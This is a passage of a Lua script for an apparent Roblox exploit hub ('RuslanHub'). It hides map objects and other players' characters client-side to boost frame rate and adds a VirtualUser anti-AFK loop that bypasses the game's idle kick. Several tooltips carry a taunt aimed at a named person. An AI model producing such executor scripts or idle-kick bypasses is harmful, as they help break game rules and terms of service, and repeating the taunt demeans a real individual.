                        game:GetService("Workspace").Park.Borders.Parent = game:GetService("Teams")
                        game:GetService("Workspace").Park["Trash Cans"].Parent = game:GetService("Teams")
                        game:GetService("Workspace").Park["TV Screen"].Parent = game:GetService("Teams")
                        game:GetService("Workspace").Park.Fences.Parent = game:GetService("Teams")
                    end)
                end
                
                if game.PlaceId == 10240522770 then -- Rec Game
                    pcall(function()
                        game:GetService("Workspace").Building.Parent = game:GetService("ReplicatedStorage")
                    end)
                    pcall(function()
                        game:GetService("Workspace").Gym.Parent = game:GetService("ReplicatedStorage")
                    end)
                end
            
            end
            
            if Toggles.clearmap.Value == false then
                if game.PlaceId == 8657449735 then -- Personal Gym
                    pcall(function()
                        game:GetService("ReplicatedStorage").Building.Parent = game:GetService("Workspace")
                        game:GetService("ReplicatedStorage")["Fake Plaza"].Parent = game:GetService("Workspace")
                        game:GetService("ReplicatedStorage").Building.Carpet.Parent = game:GetService("Workspace")
                    end)
                end
                
                if game.PlaceId == 10107441386 then -- Park
                    pcall(function()
                        game:GetService("ReplicatedStorage")["Fake Plaza"].Parent = game:GetService("Workspace")
                        game:GetService("ReplicatedStorage")["Path Walls"].Parent = game:GetService("Workspace").Park
                        game:GetService("ReplicatedStorage").Benches.Parent = game:GetService("Workspace").Park
                        game:GetService("ReplicatedStorage").Borders.Parent = game:GetService("Workspace").Park
                        game:GetService("ReplicatedStorage")["Trash Cans"].Parent = game:GetService("Workspace").Park
                        game:GetService("ReplicatedStorage")["TV Screen"].Parent = game:GetService("Workspace").Park
                        game:GetService("ReplicatedStorage").Fences.Parent = game:GetService("Workspace").Park
                    end)
                end
                
                if game.PlaceId == 10240522770 then -- Rec Game
                    pcall(function()
                        game:GetService("ReplicatedStorage").Gym.Parent = game.Workspace
                    end)
                end
            
            
            end
        
        end)
        Toggles.clearmap:SetValue(false)
        
        LeftGroupFPS:AddToggle('clearnets', {
            Text = 'Clear Net',
            Default = false,
            Tooltip = 'Activate highly recommended.' -- Information shown when you hover over the toggle
        })
        
        Toggles.clearnets:OnChanged(function()
            if Toggles.clearnets.Value == true then
                pcall(function()
                    for i, v in pairs(game:GetService("Workspace"):GetDescendants()) do
                        if v.Name == "Net" then
                            v.Parent = game:GetService("Teams")
                        end
                    end
                end)
            end
            
            if Toggles.clearnets.Value == false then
                pcall(function()
                    for i, v in pairs(game:GetService("Teams"):GetDescendants()) do
                        if v.Name == "Net" then
                            v.Parent = game:GetService("Workspace")
                        end
                    end
                end)
            end
        
        end)
        Toggles.clearnets:SetValue(false)
        
        LeftGroupFPS:AddDivider()
        
        LeftGroupFPS:AddToggle('fpsbooster3', {
            Text = 'Court #1',
            Default = false,
            Tooltip = 'Activate highly recommended drako is gay. [PARK] ' -- Information shown when you hover over the toggle
        })
        
        Toggles.fpsbooster3:OnChanged(function()
            if Toggles.fpsbooster3.Value == true then
                pcall(function()
                    game:GetService("Workspace").Courts["Court.1"].Parent = game:GetService("ReplicatedFirst")
                end)
            end
            if Toggles.fpsbooster3.Value == false then
                pcall(function()
                    game:GetService("ReplicatedFirst")["Court.1"].Parent = game:GetService("Workspace").Courts
                end)
            end
        end)
        Toggles.fpsbooster3:SetValue(false)
        
        LeftGroupFPS:AddToggle('fpsbooster4', {
            Text = 'Court #2',
            Default = false,
            Tooltip = 'Activate highly recommended drako is gay. [PARK]' -- Information shown when you hover over the toggle
        })
        
        Toggles.fpsbooster4:OnChanged(function()
            if Toggles.fpsbooster4.Value == true then
                pcall(function()
                    game:GetService("Workspace").Courts["Court.2"].Parent = game:GetService("ReplicatedFirst")
                end)
            end
            if Toggles.fpsbooster4.Value == false then
                pcall(function()
                    game:GetService("ReplicatedFirst")["Court.2"].Parent = game:GetService("Workspace").Courts
                end)
            end
        end)
        Toggles.fpsbooster4:SetValue(false)
        
        LeftGroupFPS:AddToggle('fpsbooster5', {
            Text = 'Court #3',
            Default = false,
            Tooltip = 'Activate highly recommended drako is gay. [PARK]' -- Information shown when you hover over the toggle
        })
        
        Toggles.fpsbooster5:OnChanged(function()
            if Toggles.fpsbooster5.Value == true then
                pcall(function()
                    game:GetService("Workspace").Courts["Court.3"].Parent = game:GetService("ReplicatedFirst")
                end)
            end
            if Toggles.fpsbooster5.Value == false then
                pcall(function()
                    game:GetService("ReplicatedFirst")["Court.3"].Parent = game:GetService("Workspace").Courts
                end)
            end
        end)
        Toggles.fpsbooster5:SetValue(false)
        
        LeftGroupFPS:AddToggle('fpsbooster6', {
            Text = 'Court #4',
            Default = false,
            Tooltip = 'Activate highly recommended drako is gay. [PARK]' -- Information shown when you hover over the toggle
        })
        
        Toggles.fpsbooster6:OnChanged(function()
            if Toggles.fpsbooster6.Value == true then
                pcall(function()
                    game:GetService("Workspace").Courts["Court.4"].Parent = game:GetService("ReplicatedFirst")
                end)
            end
            if Toggles.fpsbooster6.Value == false then
                pcall(function()
                    game:GetService("ReplicatedFirst")["Court.4"].Parent = game:GetService("Workspace").Courts
                end)
            end
        end)
        Toggles.fpsbooster6:SetValue(false)
        
        LeftGroupFPS:AddToggle('fpsbooster7', {
            Text = 'Court #5',
            Default = false,
            Tooltip = 'Activate highly recommended drako is gay. [PARK]' -- Information shown when you hover over the toggle
        })
        
        Toggles.fpsbooster7:OnChanged(function()
            if Toggles.fpsbooster7.Value == true then
                pcall(function()
                    game:GetService("Workspace").Courts["Court.5"].Parent = game:GetService("ReplicatedFirst")
                end)
            end
            if Toggles.fpsbooster7.Value == false then
                pcall(function()
                    game:GetService("ReplicatedFirst")["Court.5"].Parent = game:GetService("Workspace").Courts
                end)
            end
        end)
        Toggles.fpsbooster7:SetValue(false)
        
        
        LeftGroupFPS:AddToggle('fpsbooster8', {
            Text = 'Court #6',
            Default = false,
            Tooltip = 'Activate highly recommended drako is gay. [PARK]' -- Information shown when you hover over the toggle
        })
        
        Toggles.fpsbooster8:OnChanged(function()
            if Toggles.fpsbooster8.Value == true then
                pcall(function()
                    game:GetService("Workspace").Courts["Court.6"].Parent = game:GetService("ReplicatedFirst")
                end)
            end
            if Toggles.fpsbooster8.Value == false then
                pcall(function()
                    game:GetService("ReplicatedFirst")["Court.6"].Parent = game:GetService("Workspace").Courts
                end)
            end
        end)
        Toggles.fpsbooster8:SetValue(false)
        
        
        LeftGroupFPS:AddToggle('fpsbooster9', {
            Text = 'Court #7',
            Default = false,
            Tooltip = 'Activate highly recommended drako is gay. [PARK]' -- Information shown when you hover over the toggle
        })
        
        Toggles.fpsbooster9:OnChanged(function()
            if Toggles.fpsbooster9.Value == true then
                pcall(function()
                    game:GetService("Workspace").Courts["Court.7"].Parent = game:GetService("ReplicatedFirst")
                end)
            end
            if Toggles.fpsbooster9.Value == false then
                pcall(function()
                    game:GetService("ReplicatedFirst")["Court.7"].Parent = game:GetService("Workspace").Courts
                end)
            end
        end)
        Toggles.fpsbooster9:SetValue(false)
        
        local RightGroupFPS = Tabs.Second:AddRightGroupbox('$$ FPS Players Options $$ 🚬🚬')
        
        RightGroupFPS:AddToggle('fpsbooster10', {
            Text = 'Not Playing Delete',
            Default = false,
            Tooltip = 'Delete players not playing' -- Information shown when you hover over the toggle
        })
        
        Toggles.fpsbooster10:OnChanged(function()
            if Toggles.fpsbooster10.Value == true then
                for i, v in pairs(game.Players:GetPlayers()) do
                    local Character = v.Character
                    if Character.MyCourt.Value == nil then
                        Character.Parent = game:GetService("ReplicatedStorage")
                    end
                    if game.Players.LocalPlayer.Character.Parent == game:GetService("ReplicatedStorage") then
                        game.Players.LocalPlayer.Character.Parent = game:GetService("Workspace")
                    end
                end
            end
            if Toggles.fpsbooster10.Value == false then
                for i, v in pairs(game:GetService("ReplicatedStorage"):GetChildren()) do
                    v.Parent = game:GetService("Workspace")
                end
            end
        end)
        Toggles.fpsbooster10:SetValue(false)
        
        RightGroupFPS:AddToggle('unloadallplayers', {
            Text = 'Unload All Players',
            Default = false,
            Tooltip = 'This increase hella fps, if you want just practice or something with good fps. +150FPS' -- Information shown when you hover over the toggle
        })
        
        
        Toggles.unloadallplayers:OnChanged(function()
            if Toggles.unloadallplayers.Value == true then
                
                for i, v in pairs(game.Players:GetChildren()) do
                    plr = game.Players.LocalPlayer
                    if v.Character and v ~= plr then
                        v.Character.Parent = game:GetService("ReplicatedStorage")
                    end
                
                end
            end
            if Toggles.unloadallplayers.Value == false then
                for i, v in pairs(game.ReplicatedStorage:GetChildren()) do
                    v.Parent = game:GetService("Workspace")
                end
            end
        end)
        
        Toggles.unloadallplayers:SetValue(false)
        
        RightGroupFPS:AddToggle('unloadfarplayers', {
            Text = 'Unload Far Players [READ]',
            Default = false,
            Tooltip = 'This increase hella fps, very recommended [best fps feature]\nif u enabled this enable the second too [IMPORTANT]' -- Information shown when you hover over the toggle
        })
        
        
        Toggles.unloadfarplayers:OnChanged(function()
            if Toggles.unloadfarplayers.Value == true then
                
                if Toggles.unloadfarplayers.Value == true then
                    while Toggles.unloadfarplayers.Value == true do
                        if Toggles.unloadfarplayers.Value == true then
                            wait(0.1)
                            for i, v in pairs(game.Players:GetChildren()) do
                                local character = v.Character or v.CharacterAdded:Wait()
                                local plrhumanoid
                                plrhumanoid = v.Character:WaitForChild("HumanoidRootPart")
                                --repeat wait() until v.Character
                                local xd2 = v.Character:FindFirstChild("Head")
                                if v ~= game.Players.LocalPlayer and game.Players.LocalPlayer:DistanceFromCharacter(xd2.Position) > Options.firstdiscancefpsultimate.Value then
                                    plr = game.Players.LocalPlayer
                                    if v.Character and v ~= plr then
                                        wait(0)
                                        if Toggles.unloadfarplayers.Value == true then
                                            if v.Character then
                                                local character = v.Character or v.CharacterAdded:Wait()
                                                local plrhumanoid
                                                plrhumanoid = v.Character:WaitForChild("HumanoidRootPart")
                                                v.Character.Parent = game:GetService("ReplicatedStorage")
                                            --repeat wait() until v.Character
                                            end
                                        end
                                    end
                                end
                            end
                        end
                    end
                end
            
            
            
            end
            if Toggles.unloadfarplayers.Value == false then
                for i, v in pairs(game.ReplicatedStorage:GetChildren()) do
                    v.Parent = game:GetService("Workspace")
                end
            
            end
        end)
        
        Toggles.unloadfarplayers:SetValue(false)
        
        
        RightGroupFPS:AddSlider('firstdiscancefpsultimate', {
            Text = 'Distance #1',
            Default = 180,
            Min = 80,
            Max = 300,
            Rounding = 0,
            Compact = true,
        })
        
        local Number = Options.firstdiscancefpsultimate.Value
        Options.firstdiscancefpsultimate:OnChanged(function()
            end)
        
        Options.firstdiscancefpsultimate:SetValue(123)
        
        
        
        Library:SetWatermarkVisibility(false)
        Library.KeybindFrame.Visible = false; -- todo: add a function for this
        Library:OnUnload(function()
            Library.Unloaded = true
        end)
        
        local MenuGroup = Tabs['UI Settings']:AddLeftGroupbox('Menu')
        MenuGroup:AddButton('Unload', function()
            Library:Unload()
        end)
        MenuGroup:AddLabel('Menu bind'):AddKeyPicker('MenuKeybind', {
            Default = 'Zero',
            NoUI = true,
            Text = 'Menu keybind'
        })
        Library.ToggleKeybind = Options.MenuKeybind
        ThemeManager:SetLibrary(Library)
        SaveManager:SetLibrary(Library)
        SaveManager:IgnoreThemeSettings()
        SaveManager:SetIgnoreIndexes({'MenuKeybind'})
        ThemeManager:SetFolder('RuslanHub')
        SaveManager:SetFolder('RuslanHub/specific-game')
        SaveManager:BuildConfigSection(Tabs['UI Settings'])
        ThemeManager:ApplyToTab(Tabs['UI Settings'])
        game.Players.LocalPlayer.CameraMaxZoomDistance = 1000
        
        local vu = game:GetService("VirtualUser")
        game:GetService("Players").LocalPlayer.Idled:connect(function()
            vu:Button2Down(Vector2.new(0, 0), workspace.CurrentCamera.CFrame)
            wait(1)
            vu:Button2Up(Vector2.new(0, 0), workspace.CurrentCamera.CFrame)
        end)
    
    end -- [END HWID]
end -- [END HWID]
